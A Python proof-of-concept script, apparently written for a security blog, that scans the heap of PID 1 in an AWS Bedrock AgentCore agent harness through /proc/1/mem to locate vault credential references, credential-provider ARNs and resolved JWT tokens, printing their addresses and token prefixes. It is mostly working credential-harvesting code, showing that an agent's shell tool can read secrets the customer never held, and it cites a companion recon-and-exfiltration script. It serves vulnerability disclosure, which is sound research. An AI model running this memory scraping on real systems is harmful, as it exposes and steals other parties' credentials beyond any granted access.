"""Blog demo — trace the vault resolution in PID 1's heap.

Searches /proc/1/mem for the three stages of credential resolution:
  1. ${arn:...} wrapper — the pre-resolution config reference
  2. Bare ARN (without ${}) — after regex extraction
  3. JWT bytes (eyJ...) — the resolved credential itself

Finding all three in the same heap proves the resolution happened
and the credential is sitting there as a plain string.

Uses the same proven regexes from pid1_identity_recon_exfil.py.

No env vars needed.
Hosted at github.com/nivmorabin/skills/dict-walk/pid1_vault_canary.py
"""
import hashlib
import re
import sys


# Regexes from pid1_identity_recon_exfil.py (proven in 14.1)
CRED_PROVIDER_ARN_RE = re.compile(
    rb'arn:aws:bedrock-agentcore:[a-z0-9\-]+:\d{12}:'
    rb'(?:credential-provider|token-vault/default/apikeycredentialprovider|token-vault/default/oauth2credentialprovider)'
    rb'/[A-Za-z0-9_\-]+'
)
VAULT_REF_RE = re.compile(
    rb'\$\{arn:aws:bedrock-agentcore:[a-z0-9\-]+:\d{12}:'
    rb'(?:credential-provider|token-vault)[^}]{5,120}\}'
)
JWT_RE = re.compile(rb'eyJ[A-Za-z0-9_\-]{20,}\.eyJ[A-Za-z0-9_\-]{20,}\.[A-Za-z0-9_\-]{20,}')


def printable(raw, max_len=120):
    """Convert raw bytes to printable string (dots for non-printable)."""
    s = ''.join(chr(b) if 32 <= b < 127 else '.' for b in raw)
    return s[:max_len] + ('...' if len(s) > max_len else '')


def main():
    print('=' * 60)
    print('  VAULT RESOLUTION TRACE IN PID 1 HEAP')
    print('=' * 60)
    print()
    print('  Searching /proc/1/mem for three resolution stages:')
    print('    Stage 1: ${arn:...} wrapper (pre-resolution config)')
    print('    Stage 2: Bare credential-provider ARN (after regex extraction)')
    print('    Stage 3: JWT bytes eyJ... (the resolved credential)')
    print()

    # Enumerate readable writable regions (where heap data lives)
    regions = []
    for line in open('/proc/1/maps').readlines():
        parts = line.split()
        if len(parts) < 2:
            continue
        perms = parts[1]
        if 'r' not in perms:
            continue
        try:
            start_s, end_s = parts[0].split('-')
            lo, hi = int(start_s, 16), int(end_s, 16)
            if 4096 <= hi - lo <= 50 * 1024 * 1024:
                regions.append((lo, hi))
        except:
            continue

    print(f'  Scanning {len(regions)} memory regions...')
    print()

    # Scan
    vault_refs = []      # ${arn:...} wrappers
    cred_arns = []       # bare ARNs
    jwts = []            # JWT tokens

    with open('/proc/1/mem', 'rb') as mem:
        for lo, hi in regions:
            try:
                mem.seek(lo)
                chunk = mem.read(hi - lo)
            except (OSError, OverflowError):
                continue

            for m in VAULT_REF_RE.finditer(chunk):
                addr = lo + m.start()
                vault_refs.append((addr, m.group(0)))

            for m in CRED_PROVIDER_ARN_RE.finditer(chunk):
                addr = lo + m.start()
                cred_arns.append((addr, m.group(0)))

            for m in JWT_RE.finditer(chunk):
                tok = m.group(0)
                if len(tok) >= 600:
                    addr = lo + m.start()
                    sha = hashlib.sha256(tok).hexdigest()
                    jwts.append((addr, tok, sha))

    # --- Stage 1: ${arn:...} wrappers ---
    print('--- STAGE 1: ${arn:...} wrappers (pre-resolution config) ---')
    print(f'  Found: {len(vault_refs)}')
    # Dedupe by value
    unique_refs = sorted(set(ref.decode('utf-8', errors='replace') for _, ref in vault_refs))
    for ref in unique_refs:
        print(f'    {ref}')
    if vault_refs:
        print(f'\n  First hit at: {hex(vault_refs[0][0])}')
        print(f'  This is the harness config value BEFORE resolution.')
    print()

    # --- Stage 2: Bare ARNs ---
    print('--- STAGE 2: Bare credential-provider ARNs (after regex extraction) ---')
    print(f'  Found: {len(cred_arns)}')
    unique_arns = sorted(set(arn.decode('utf-8', errors='replace') for _, arn in cred_arns))
    for arn in unique_arns:
        print(f'    {arn}')
    if cred_arns:
        print(f'\n  First hit at: {hex(cred_arns[0][0])}')
        print(f'  This is the ARN after resolve_header_references() regex-extracted it.')
    print()

    # --- Stage 3: JWT tokens ---
    print('--- STAGE 3: JWT tokens (the resolved credential) ---')
    # Dedupe by SHA
    seen_shas = set()
    unique_jwts = []
    for addr, tok, sha in jwts:
        if sha not in seen_shas:
            seen_shas.add(sha)
            unique_jwts.append((addr, tok, sha))

    print(f'  Found: {len(jwts)} occurrences, {len(unique_jwts)} unique token(s)')
    for addr, tok, sha in unique_jwts[:3]:
        print(f'    addr={hex(addr)}  len={len(tok)}  sha256={sha[:32]}...')
        print(f'    head: {tok[:50].decode("ascii")}...')
    print()

    # --- Summary ---
    print('=' * 60)
    print('  RESOLUTION TRACE COMPLETE')
    print('=' * 60)
    print()

    if vault_refs and unique_jwts:
        print('  All three stages found in PID 1 heap:')
        print()
        print(f'  1. ${{arn:...}} wrapper:')
        print(f'     {unique_refs[0][:80]}...')
        print(f'       -> The config value. Customer put this in create_harness().')
        print()
        print(f'  2. Bare ARN:')
        if unique_arns:
            print(f'     {unique_arns[0]}')
        print(f'       -> After regex extraction by resolve_header_references().')
        print()
        print(f'  3. Resolved JWT:')
        print(f'     {unique_jwts[0][1][:60].decode("ascii")}...')
        print(f'     (len={len(unique_jwts[0][1])}, sha256={unique_jwts[0][2][:24]}...)')
        print(f'       -> The actual credential. Returned by get_resource_api_key().')
        print()
        print('  ---------------------------------------------------------')
        print()
        print('  The complete resolution chain is visible in ONE memory dump:')
        print('    config reference -> extracted ARN -> resolved credential')
        print()
        print('  The credential the customer NEVER held locally is sitting')
        print('  in PID 1 heap as a plain Python string, readable by the')
        print('  shell tool via /proc/1/mem.')
    elif not vault_refs and not unique_jwts:
        print('  No vault references or JWTs found.')
        print('  Run Cell 2 first to trigger a legitimate MCP call.')
    else:
        print(f'  Partial results: vault_refs={len(vault_refs)} jwts={len(unique_jwts)}')


if __name__ == '__main__':
    main()
